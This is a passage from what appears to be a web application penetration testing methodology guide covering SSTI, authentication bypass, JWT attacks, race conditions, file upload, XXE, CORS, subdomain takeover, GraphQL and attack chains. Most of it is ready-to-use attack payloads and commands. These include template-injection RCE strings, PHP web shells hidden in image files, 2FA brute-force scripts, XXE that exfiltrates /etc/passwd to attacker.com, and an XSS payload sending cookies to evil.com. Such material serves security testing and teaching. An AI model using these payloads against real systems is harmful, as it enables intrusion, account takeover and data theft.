  # PDF generation SSRF
  echo '<iframe src="http://169.254.169.254/latest/meta-data/">' > ssrf.html
  ```
  :::
::

### Server-Side Template Injection (SSTI)

::code-collapse
---
label: "SSTI Detection & Exploitation"
---

```bash [SSTI Detection]
# Detection payloads - inject in every input field
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}

# If 49 appears in response = SSTI confirmed
# If 7777777 appears = Jinja2/Twig
# If 49 appears = Jinja2/Twig/Smarty/Mako

# Tplmap - Automated SSTI
tplmap -u "https://target.com/page?name=test"
tplmap -u "https://target.com/page?name=test" --os-shell
tplmap -u "https://target.com/page?name=test" --os-cmd "id"
```

```python [Jinja2 (Python)]
# Read file
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# Bypass filters
{% set chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr %}
{{ ''[chr(95)+chr(95)+'class'+chr(95)+chr(95)] }}
```

```ruby [ERB (Ruby)]
<%= system("id") %>
<%= `cat /etc/passwd` %>
<%= IO.popen('id').readlines() %>
```

```java [Freemarker (Java)]
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
${object.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
```

```text [Smarty (PHP)]
{system('id')}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

```text [Pebble (Java)]
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toList()) }}
```
::

---

## Authentication & Authorization

::badge
**Phase 4 — Access Control Testing**
::

### Authentication Bypass

::card-group
  :::card
  ---
  icon: i-lucide-key
  title: Brute Force
  ---
  - Default credentials testing
  - Credential stuffing
  - Password spraying
  - Rate limit bypass
  - Account lockout bypass
  - CAPTCHA bypass
  :::

  :::card
  ---
  icon: i-lucide-lock-open
  title: Session Attacks
  ---
  - Session fixation
  - Session hijacking
  - JWT manipulation
  - Cookie tampering
  - Token prediction
  - Remember-me abuse
  :::

  :::card
  ---
  icon: i-lucide-user-x
  title: Logic Flaws
  ---
  - Password reset poisoning
  - OAuth misconfigurations
  - 2FA bypass
  - Registration flaws
  - Account takeover chains
  - Race conditions
  :::

  :::card
  ---
  icon: i-lucide-shield-off
  title: Authorization
  ---
  - IDOR
  - Privilege escalation
  - Horizontal access control
  - Vertical access control
  - Missing function-level access
  - Parameter manipulation
  :::
::

### IDOR (Insecure Direct Object Reference)

::tabs
  :::tabs-item{icon="i-lucide-search" label="Detection Methods"}
  ```bash [IDOR Hunting]
  # Common IDOR parameters
  # id, user_id, account_id, profile_id, order_id, invoice_id
  # doc_id, file_id, report_id, message_id, uid, pid, ref

  # Test with two accounts (Account A and B)
  # 1. Capture request from Account A
  # 2. Replace identifiers with Account B's values
  # 3. Check if data is returned/modified

  # Autorize (Burp Extension) - Automated IDOR detection
  # 1. Install Autorize
  # 2. Set low-privilege cookies
  # 3. Browse as high-privilege user
  # 4. Autorize replays requests with low-privilege cookies

  # UUID/GUID IDOR
  # Check if UUIDs are predictable or leaked in:
  # - API responses
  # - Source code / JS files
  # - Error messages
  # - Public profiles
  # - Search results

  # Numeric ID testing
  curl -s "https://target.com/api/users/1001" -H "Cookie: session=ATTACKER_SESSION"
  curl -s "https://target.com/api/users/1002" -H "Cookie: session=ATTACKER_SESSION"

  # Batch ID testing
  for i in $(seq 1 1000); do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/invoice/$i" -H "Cookie: session=ATTACKER_SESSION")
    if [ "$response" != "403" ] && [ "$response" != "401" ]; then
      echo "[+] Accessible: /api/invoice/$i (HTTP $response)"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-shuffle" label="Bypass Techniques"}
  ```text [IDOR Bypass Methods]
  # 1. Parameter pollution
  GET /api/user?id=attacker_id&id=victim_id

  # 2. Change HTTP method
  GET /api/user/victim_id  → 403
  PUT /api/user/victim_id  → 200
  POST /api/user/victim_id → 200

  # 3. Wrap ID in array
  {"id": "victim_id"}  →  {"id": ["victim_id"]}

  # 4. JSON parameter pollution
  {"id": "attacker_id", "id": "victim_id"}

  # 5. Wildcard / regex
  GET /api/users/*
  GET /api/users/%2a

  # 6. Change response type
  GET /api/user/victim_id HTTP/1.1
  Accept: application/xml  (instead of JSON)

  # 7. Add .json extension
  GET /api/user/victim_id.json

  # 8. Version manipulation
  /api/v1/user/victim_id  → 403
  /api/v2/user/victim_id  → 200
  /api/v3/user/victim_id  → 200

  # 9. Case change
  /api/Users/victim_id
  /api/USERS/victim_id

  # 10. Swap GUID with numeric
  /api/user/550e8400-e29b-41d4-a716-446655440000  → 403
  /api/user/1234  → 200
  ```
  :::
::

### JWT Attacks

::code-collapse
---
label: "JWT Attack Techniques"
---

```bash [JWT Analysis]
# Decode JWT
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature" | \
  cut -d'.' -f1-2 | tr '.' '\n' | base64 -d 2>/dev/null

# jwt_tool - Comprehensive JWT testing
python3 jwt_tool.py <JWT_TOKEN> -M at    # All tests
python3 jwt_tool.py <JWT_TOKEN> -X a     # Algorithm: none
python3 jwt_tool.py <JWT_TOKEN> -X n     # Null signature
python3 jwt_tool.py <JWT_TOKEN> -X s     # Sign with symmetric key
python3 jwt_tool.py <JWT_TOKEN> -X k     # Key confusion (RS256→HS256)

# Brute force JWT secret
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# jku/x5u header injection
python3 jwt_tool.py <JWT_TOKEN> -X i -ju "https://evil.com/jwks.json"
```

```text [JWT Attack Payloads]
# 1. Algorithm None Attack
# Change header: {"alg":"none"} and remove signature
# Variations: None, NONE, nOnE, noNe

# 2. Algorithm Confusion (RS256 → HS256)
# Sign token with public key using HS256
# Server verifies with same public key as HMAC secret

# 3. JWK Header Injection
# Add jwk header with your own public key
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}

# 4. KID Path Traversal
{"alg":"HS256","kid":"../../dev/null"}
# Sign with empty string as secret

{"alg":"HS256","kid":"../../etc/hostname"}
# Sign with content of /etc/hostname as secret

# 5. SQL Injection in KID
{"alg":"HS256","kid":"1' UNION SELECT 'secret123' -- "}
# Sign with 'secret123' as the secret

# 6. Claim Manipulation
# Change: "role":"user" → "role":"admin"
# Change: "sub":"1234" → "sub":"1"
# Add: "is_admin":true
```
::

### Password Reset Poisoning

```bash [Reset Token Attacks]
# Host header poisoning
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# X-Forwarded-Host injection
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com

# Additional headers to try
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-URL: https://evil.com
X-Rewrite-URL: https://evil.com
Forwarded: host=evil.com
X-Host: evil.com

# Token in Referer header leakage
# 1. Click reset link
# 2. On password reset page, click external link
# 3. Token leaks in Referer header

# Token predictability
# Collect multiple tokens and analyze:
# - Timestamp-based
# - Sequential
# - Short length (brutable)
# - MD5/SHA1 of email + timestamp
```

### OAuth Vulnerabilities

::accordion
  :::accordion-item{icon="i-lucide-external-link" label="OAuth Misconfigurations"}
  ```text [OAuth Attack Vectors]
  # 1. Open Redirect in redirect_uri
  /authorize?client_id=xxx&redirect_uri=https://target.com.evil.com&response_type=code
  /authorize?client_id=xxx&redirect_uri=https://target.com/callback/../../../evil&response_type=code
  /authorize?client_id=xxx&redirect_uri=https://target.com/callback?next=https://evil.com&response_type=code
  /authorize?client_id=xxx&redirect_uri=https://target.com@evil.com&response_type=code

  # 2. State parameter missing/reusable
  # Generate authorize URL without state parameter
  # Check if login CSRF is possible

  # 3. Authorization code reuse
  # Use the same code twice
  # Check if code has time limit

  # 4. Token leakage via Referer
  # response_type=token with redirect to page containing external resources

  # 5. Scope manipulation
  /authorize?client_id=xxx&scope=read → change to scope=admin
  /authorize?client_id=xxx&scope=read+write+admin

  # 6. PKCE bypass
  # Remove code_verifier from token request
  # Use plain code_challenge_method
  ```
  :::

  :::accordion-item{icon="i-lucide-user-check" label="Account Takeover via OAuth"}
  ```text [OAuth ATO Chains]
  # Pre-account takeover
  # 1. Register account with victim email (no verification)
  # 2. Victim links OAuth provider
  # 3. Attacker logs in with pre-registered credentials

  # OAuth linking CSRF
  # 1. Start OAuth flow with attacker account
  # 2. Intercept callback URL with code
  # 3. Send callback URL to victim
  # 4. Victim's account linked to attacker's OAuth

  # Provider confusion
  # Link attacker's Google to victim's account via:
  # - Missing email verification
  # - Email change race condition
  # - Provider impersonation
  ```
  :::
::

### 2FA Bypass Techniques

::collapsible
---
label: "Two-Factor Authentication Bypass Methods"
---

| Method | Description |
| ------ | ----------- |
| Response manipulation | Change `"success":false` to `"success":true` |
| Status code manipulation | Change 401/403 response to 200 |
| Direct navigation | Skip 2FA page, go directly to dashboard URL |
| Brute force | 4-6 digit codes with no rate limiting |
| Rate limit bypass | Rotate IPs, add headers like `X-Forwarded-For` |
| Backup codes | Try common backup codes or brute force them |
| Previous session | Use old session cookie that predates 2FA setup |
| OAuth bypass | Login via OAuth may skip 2FA |
| Password reset | Reset password may disable 2FA |
| Null/empty code | Send empty `otp=` or `otp=null` |
| Array submission | Send `otp[]=1234&otp[]=5678` |
| Code reuse | Use same valid code multiple times |
| Race condition | Send same code in multiple parallel requests |

```bash [2FA Brute Force]
# Generate 4-digit codes
seq -w 0000 9999 > 4digit_codes.txt

# Generate 6-digit codes
seq -w 000000 999999 > 6digit_codes.txt

# Brute force with ffuf
ffuf -u "https://target.com/verify-2fa" -X POST \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "otp=FUZZ" \
  -w 4digit_codes.txt -mc 302 -t 50

# With rate limit bypass (IP rotation)
ffuf -u "https://target.com/verify-2fa" -X POST \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: FUZZ2" \
  -d "otp=FUZZ" \
  -w 4digit_codes.txt:FUZZ \
  -w ips.txt:FUZZ2 -mc 302 -t 20
```
::

---

## Advanced Attack Techniques

::badge
**Phase 5 — Advanced Exploitation**
::

### Race Conditions

::tabs
  :::tabs-item{icon="i-lucide-timer" label="Detection & Exploitation"}
  ```bash [Race Condition Testing]
  # Turbo Intruder (Burp Extension) - Single-packet attack
  # Python script for Turbo Intruder:
  # def queueRequests(target, wordlists):
  #     engine = RequestEngine(endpoint=target.endpoint,
  #                           concurrentConnections=1,
  #                           engine=Engine.BURP2)
  #     for i in range(20):
  #         engine.queue(target.req, gate='race1')
  #     engine.openGate('race1')

  # Using curl with parallel requests
  seq 1 50 | xargs -P 50 -I {} \
    curl -s -o /dev/null -w "%{http_code}\n" \
    "https://target.com/api/redeem-coupon" \
    -X POST -H "Cookie: session=YOUR_SESSION" \
    -d "code=DISCOUNT50"

  # Using GNU parallel
  parallel -j 50 curl -s -o /dev/null -w '%{http_code}\n' \
    -X POST "https://target.com/api/transfer" \
    -H "Cookie: session=YOUR_SESSION" \
    -d "amount=1000&to=attacker" ::: $(seq 1 50)
  ```

  **Common Race Condition Targets:**

  - Coupon/promo code redemption (apply same code multiple times)
  - Money transfers (double spending)
  - Like/vote systems (multiple votes)
  - Invitation systems (use same invite multiple times)
  - File uploads (overwrite race)
  - Account creation (duplicate accounts)
  - Follow/unfollow (follower count manipulation)
  - Rate limiting (bypass via simultaneous requests)
  :::

  :::tabs-item{icon="i-lucide-code" label="HTTP/2 Single-Packet Attack"}
  ```python [single_packet_attack.py]
  import requests
  import threading
  
  url = "https://target.com/api/redeem"
  headers = {"Cookie": "session=YOUR_SESSION"}
  data = {"code": "DISCOUNT50"}
  
  def send_request():
      r = requests.post(url, headers=headers, data=data)
      print(f"Status: {r.status_code} | Response: {r.text[:100]}")
  
  threads = []
  for i in range(50):
      t = threading.Thread(target=send_request)
      threads.append(t)
  
  # Start all threads simultaneously
  for t in threads:
      t.start()
  for t in threads:
      t.join()
  ```
  :::
::

### Prototype Pollution

```javascript [Prototype Pollution Payloads]
// URL-based
https://target.com/?__proto__[isAdmin]=true
https://target.com/?__proto__.isAdmin=true
https://target.com/?constructor[prototype][isAdmin]=true
https://target.com/?constructor.prototype.isAdmin=true

// JSON body
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}

// Nested
{"user":{"__proto__":{"role":"admin"}}}

// Bypass filters
{"__pro__proto__to__":{"isAdmin":true}}
{"constconstructorructor":{"prototype":{"isAdmin":true}}}

// Check in console:
// Object.prototype.isAdmin  → should return undefined
// After pollution → returns true
```

### HTTP Request Smuggling

::code-collapse
---
label: "Request Smuggling Techniques"
---

```text [CL.TE Smuggling]
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: target.com
```

```text [TE.CL Smuggling]
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
GPOST /
0

```

```text [TE.TE Obfuscation]
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
 : chunked
```

```bash [Detection with smuggler.py]
python3 smuggler.py -u https://target.com

# Defparam's smuggler
python3 smuggler.py -u https://target.com -m CL-TE

# HTTP Request Smuggler (Burp Extension)
# 1. Send request to Repeater
# 2. Extensions → HTTP Request Smuggler → Smuggle Probe
```
::

### Web Cache Poisoning

```bash [Cache Poisoning]
# Detect cached headers
curl -s -D - "https://target.com/" | grep -i "cache\|age\|x-cache\|cf-cache"

# Unkeyed header injection
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" -D -

# Unkeyed query parameter
curl -s "https://target.com/?utm_content=<script>alert(1)</script>" -D -

# Fat GET request
curl -s "https://target.com/api/user" -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "callback=<script>alert(1)</script>"

# Param Miner (Burp Extension)
# Right-click → Extensions → Param Miner → Guess Headers/Params

# Common unkeyed headers to test:
# X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL
# X-Rewrite-URL, X-Forwarded-Proto, X-HTTP-Method-Override
```

### WebSocket Vulnerabilities

```bash [WebSocket Testing]
# Connect to WebSocket
websocat ws://target.com/ws

# With authentication
websocat ws://target.com/ws -H "Cookie: session=YOUR_SESSION"

# Cross-Site WebSocket Hijacking (CSWSH)
# Check Origin header validation
websocat ws://target.com/ws -H "Origin: https://evil.com"

# WebSocket message injection
echo '{"action":"getUser","id":"victim_id"}' | websocat ws://target.com/ws

# SQLi via WebSocket
echo '{"query":"test'\'' OR 1=1--"}' | websocat ws://target.com/ws

# XSS via WebSocket
echo '{"message":"<img src=x onerror=alert(1)>"}' | websocat ws://target.com/ws
```

---

## File Upload Attacks

::badge
**Phase 6 — File Upload Exploitation**
::

::accordion
  :::accordion-item{icon="i-lucide-upload" label="Extension Bypass"}
  ```text [Extension Bypass List]
  # PHP bypasses
  .php → .php3, .php4, .php5, .php7, .pht, .phtml, .phar
  .php → .PHP, .Php, .pHp
  .php → .php.jpg, .php.png, .php%00.jpg
  .php → .php;.jpg (IIS)
  .php → .php%0a, .php%0d%0a
  .php → .php/.jpg (path confusion)
  .php → ..php (double dot)

  # ASP/ASPX bypasses
  .asp → .asa, .cer, .cdx
  .aspx → .ashx, .asmx, .ascx

  # JSP bypasses
  .jsp → .jspx, .jsw, .jsv, .jspf

  # General bypasses
  .htaccess upload (Apache config override)
  .user.ini upload (PHP-FPM config)
  web.config upload (IIS config)
  ```
  :::

  :::accordion-item{icon="i-lucide-file-type" label="Content-Type & Magic Bytes"}
  ```bash [Content-Type Manipulation]
  # Change Content-Type to allowed type
  Content-Type: image/jpeg
  Content-Type: image/png
  Content-Type: image/gif
  Content-Type: application/pdf

  # Magic bytes injection (add image header before PHP code)
  # GIF
  printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif

  # JPEG
  printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php.jpg

  # PNG
  printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png

  # PDF
  printf '%%PDF-1.5\n<?php system($_GET["cmd"]); ?>' > shell.pdf.php

  # Polyglot JPEG/PHP
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
  mv image.jpg image.php.jpg
  ```
  :::

  :::accordion-item{icon="i-lucide-file-warning" label="Advanced Upload Attacks"}
  ```bash [SVG XSS]
  cat > xss.svg << 'EOF'
  <?xml version="1.0" standalone="no"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      alert(document.domain);
    </script>
  </svg>
  EOF
  ```

  ```bash [SVG SSRF]
  cat > ssrf.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  EOF
  ```

  ```bash [.htaccess Upload]
  cat > .htaccess << 'EOF'
  AddType application/x-httpd-php .jpg
  EOF
  # Then upload shell.jpg containing PHP code

  cat > .user.ini << 'EOF'
  auto_prepend_file=shell.jpg
  EOF
  # PHP-FPM will prepend shell.jpg to every PHP file
  ```

  ```bash [ZIP Symlink Attack]
  # Create symlink
  ln -s /etc/passwd symlink.txt

  # Add to ZIP
  zip --symlinks exploit.zip symlink.txt

  # Upload ZIP → application extracts → reads /etc/passwd
  ```

  ```bash [ImageTragick (CVE-2016-3714)]
  cat > exploit.mvg << 'EOF'
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://example.com/image.jpg"|id")'
  pop graphic-context
  EOF
  ```
  :::
::

---

## XXE (XML External Entity)

::tabs
  :::tabs-item{icon="i-lucide-file-code" label="Basic XXE"}
  ```xml [File Read]
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>
    <data>&xxe;</data>
  </root>
  ```

  ```xml [SSRF via XXE]
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  ]>
  <root>
    <data>&xxe;</data>
  </root>
  ```

  ```xml [PHP Filter for Source Code]
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
  ]>
  <root>
    <data>&xxe;</data>
  </root>
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Blind XXE"}
  ```xml [Out-of-Band Data Exfiltration]
  <!-- Hosted on attacker server: dtd.xml -->
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfiltrate;
  ```

  ```xml [Payload]
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/dtd.xml">
    %xxe;
  ]>
  <root>
    <data>test</data>
  </root>
  ```

  ```xml [Error-Based XXE]
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
  ]>
  <root>test</root>
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="XXE Bypass & Variants"}
  ```xml [XInclude Attack]
  <!-- When you don't control entire XML document -->
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </foo>
  ```

  ```xml [UTF-7 Encoding Bypass]
  <?xml version="1.0" encoding="UTF-7"?>
  +ADwAIQ-DOCTYPE foo +AFs-
    +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI- +AD4-
  +AF0APg-
  +ADw-root+AD4AJg-xxe+ADsAPA-/root+AD4-
  ```

  ```text [Content-Type XXE Vectors]
  # JSON to XML
  Content-Type: application/xml
  (Convert JSON body to XML with XXE payload)

  # SOAP injection
  # XLSX/DOCX file upload (ZIP containing XML)
  # SVG file upload
  # RSS/Atom feed parsing
  # SAML response manipulation
  ```

  ```bash [XLSX XXE]
  # Unzip XLSX
  mkdir xxe_xlsx && cd xxe_xlsx
  unzip ../template.xlsx

  # Inject XXE into xl/workbook.xml or [Content_Types].xml
  # Add DTD entity to XML files

  # Repackage
  zip -r ../exploit.xlsx .
  ```
  :::
::

---

## CORS & Subdomain Takeover

::badge
**Phase 7 — Misconfiguration Exploitation**
::

### CORS Misconfiguration

```bash [CORS Testing]
# Test reflected origin
curl -s -D - "https://target.com/api/user" \
  -H "Origin: https://evil.com" | grep -i "access-control"

# Test null origin
curl -s -D - "https://target.com/api/user" \
  -H "Origin: null" | grep -i "access-control"

# Test subdomain wildcard
curl -s -D - "https://target.com/api/user" \
  -H "Origin: https://evil.target.com" | grep -i "access-control"

# Test with credentials
curl -s -D - "https://target.com/api/user" \
  -H "Origin: https://evil.com" | grep -i "access-control-allow-credentials"

# Prefix/suffix bypass
curl -s -D - "https://target.com/api/user" \
  -H "Origin: https://target.com.evil.com"
curl -s -D - "https://target.com/api/user" \
  -H "Origin: https://eviltarget.com"

# CORScanner - Automated
python3 cors_scan.py -u https://target.com
python3 cors_scan.py -i alive_hosts.txt -t 50

# Mass testing
cat alive_hosts.txt | while read url; do
  origin_header=$(curl -s -D - "$url" -H "Origin: https://evil.com" -o /dev/null | grep -i "access-control-allow-origin: https://evil.com")
  if [ -n "$origin_header" ]; then
    echo "[VULN] $url - Reflects arbitrary origin"
  fi
done
```

::tip
A CORS misconfiguration is only exploitable when `Access-Control-Allow-Credentials: true` is returned alongside a reflected or wildcard origin. Without credentials, the impact is significantly reduced.
::

### Subdomain Takeover

::tabs
  :::tabs-item{icon="i-lucide-globe" label="Detection"}
  ```bash [Takeover Scanning]
  # Subjack
  subjack -w resolved_final.txt -t 100 -timeout 30 -ssl \
    -c /path/to/fingerprints.json -o takeover_subjack.txt

  # Nuclei takeover templates
  nuclei -l resolved_final.txt -tags takeover -silent -o takeover_nuclei.txt

  # Can-I-Take-Over-XYZ check
  # Check CNAME records
  cat resolved_final.txt | dnsx -silent -cname -resp | tee cname_records.txt

  # Filter dangling CNAMEs
  cat cname_records.txt | grep -iE "(amazonaws|azurewebsites|cloudfront|github\.io|heroku|shopify|surge\.sh|fastly|ghost\.io|pantheon|tumblr|wordpress\.com|zendesk|bitbucket|s3\.amazonaws|elasticbeanstalk|cloudapp\.net)" | tee potential_takeovers.txt

  # Verify manually
  while read line; do
    subdomain=$(echo "$line" | awk '{print $1}')
    response=$(curl -s -o /dev/null -w "%{http_code}" "http://$subdomain")
    echo "$subdomain → HTTP $response"
  done < potential_takeovers.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Common Fingerprints"}
  | Service | CNAME Pattern | Error Signature |
  | ------- | ------------- | --------------- |
  | GitHub Pages | `*.github.io` | "There isn't a GitHub Pages site here" |
  | Heroku | `*.herokuapp.com` | "No such app" |
  | AWS S3 | `*.s3.amazonaws.com` | "NoSuchBucket" |
  | Shopify | `*.myshopify.com` | "Sorry, this shop is currently unavailable" |
  | Azure | `*.azurewebsites.net` | "404 Web Site not found" |
  | Fastly | `*.fastly.net` | "Fastly error: unknown domain" |
  | Ghost | `*.ghost.io` | "The thing you were looking for is no longer here" |
  | Surge.sh | `*.surge.sh` | "project not found" |
  | Tumblr | `*.tumblr.com` | "There's nothing here" |
  | WordPress | `*.wordpress.com` | "Do you want to register" |
  | Cargo | `*.cargocollective.com` | "404 Not Found" |
  | Zendesk | `*.zendesk.com` | "Help Center Closed" |
  | Bitbucket | `*.bitbucket.io` | "Repository not found" |
  | Pantheon | `*.pantheonsite.io` | "404 error unknown site" |
  :::
::

---

## API Security Testing

::badge
**Phase 8 — API Attack Surface**
::

### API Endpoint Discovery

```bash [API Discovery]
# Common API paths
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt \
  -mc 200,201,204,301,302,401,403,405 -t 100 -o api_endpoints.txt -of json

# API version fuzzing
ffuf -u https://target.com/api/FUZZ/users -w <(seq 1 10 | sed 's/^/v/') -mc all -fc 404

# Swagger/OpenAPI detection
ffuf -u https://target.com/FUZZ -w <(cat << 'EOF'
swagger.json
swagger.yaml
openapi.json
openapi.yaml
api-docs
api/swagger
api/swagger.json
api/v1/swagger.json
api/v2/swagger.json
api/docs
docs/api
swagger/v1/swagger.json
swagger-ui.html
swagger-resources
api-docs.json
v1/api-docs
v2/api-docs
v3/api-docs
graphql
graphiql
altair
playground
EOF
) -mc 200 -t 50

# Kiterunner - API endpoint brute force
kr scan https://target.com -w /path/to/routes-large.kite -x 20

# Extract API routes from JS files
cat js_files.txt | while read url; do
  curl -s "$url" | grep -oP '["'\''](\/api\/[a-zA-Z0-9_\-\/{}]+)["'\'']' | sort -u
done | tee js_api_routes.txt
```

### GraphQL Attacks

::code-collapse
---
label: "GraphQL Exploitation"
---

```bash [Introspection Query]
# Full introspection
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}'

# Using InQL (Burp Extension) or graphql-voyager

# Detect GraphQL endpoints
ffuf -u https://target.com/FUZZ -w <(echo -e "graphql\ngraphiql\naltair\nplayground\napi/graphql\nv1/graphql\nv2/graphql\nquery\ngql") -mc 200,405 -t 20
```

```graphql [Injection Attacks]
# SQL injection in GraphQL
{
  user(name: "admin' OR 1=1--") {
    id
    email
    password
  }
}

# IDOR via GraphQL
{
  user(id: 2) {
    id
    email
    password
    role
  }
}

# Batch query for enumeration
[
  {"query": "{user(id:1){email}}"},
  {"query": "{user(id:2){email}}"},
  {"query": "{user(id:3){email}}"},
  {"query": "{user(id:4){email}}"},
  {"query": "{user(id:5){email}}"}
]

# Alias-based brute force (bypass rate limiting)
{
  a1: login(username:"admin", password:"password1") { token }
  a2: login(username:"admin", password:"password2") { token }
  a3: login(username:"admin", password:"password3") { token }
  a4: login(username:"admin", password:"123456") { token }
  a5: login(username:"admin", password:"admin") { token }
}

# Nested query DoS
{
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              title
            }
          }
        }
      }
    }
  }
}
```

```graphql [Mutation Attacks]
# Privilege escalation
mutation {
  updateUser(id: 1, role: "admin") {
    id
    role
  }
}

# Mass assignment
mutation {
  updateProfile(input: {
    name: "attacker"
    email: "attacker@evil.com"
    role: "admin"
    is_verified: true
    balance: 999999
  }) {
    id
    role
    balance
  }
}
```
::

### API-Specific Vulnerabilities

::field-group
  :::field{name="Mass Assignment" type="critical"}
  Send additional parameters in API requests that map to internal model fields. Test by adding `role`, `is_admin`, `verified`, `balance`, `permissions` to registration or profile update requests.
  :::

  :::field{name="BOLA/IDOR" type="critical"}
  Broken Object Level Authorization — change object IDs in API calls to access other users' resources. Test every endpoint that references a user-specific object.
  :::

  :::field{name="Rate Limiting" type="medium"}
  Check if API endpoints have proper rate limiting. Test with parallel requests, different authentication tokens, IP rotation via `X-Forwarded-For`.
  :::

  :::field{name="Excessive Data Exposure" type="high"}
  API returns more data than needed. Check responses for sensitive fields like `password_hash`, `ssn`, `internal_id`, `api_key` that the frontend doesn't display.
  :::

  :::field{name="Improper Assets Management" type="medium"}
  Older API versions (`/api/v1/`) may lack security controls present in newer versions (`/api/v3/`). Always test deprecated endpoints.
  :::
::

---

## Chaining Vulnerabilities

::badge
**Phase 9 — Attack Chains**
::

::caution
Individual low-severity vulnerabilities can become critical when chained together. Always think about how findings can be combined for maximum impact.
::

### Common Attack Chains

::steps{level="4"}

#### Self-XSS → Account Takeover
1. Find Self-XSS in profile field
2. Chain with CSRF (if no anti-CSRF token) to inject XSS into victim's profile
3. XSS payload steals session token
4. Full account takeover achieved

```javascript [Chained Payload]
// Self-XSS payload that steals admin cookie
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

// CSRF page to inject the XSS
<html>
<body>
<form action="https://target.com/profile/update" method="POST">
  <input name="bio" value='<img src=x onerror="fetch(`https://evil.com/steal?c=`+document.cookie)">'>
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

#### Open Redirect → OAuth Token Theft
1. Find open redirect on target domain
2. Use it as `redirect_uri` in OAuth flow
3. Authorization code or token redirected to attacker-controlled URL

```text [Chain Example]
